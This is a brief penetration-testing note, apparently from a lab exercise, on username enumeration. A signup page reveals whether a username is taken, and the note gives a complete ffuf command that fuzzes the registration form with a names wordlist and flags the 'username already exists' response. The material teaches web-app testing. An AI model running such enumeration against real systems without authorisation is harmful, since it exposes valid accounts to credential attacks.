
Scenario: A login registration page shows 'Username already exists' when registering for an account with an existing username.

Methodology: Use `ffuf` to dictionary attack usernames, and look for the 'Username already exists' response.

`ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=abcdefg&cpassword=abcdefg" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.217.123/customers/signup -mr "username already exists"`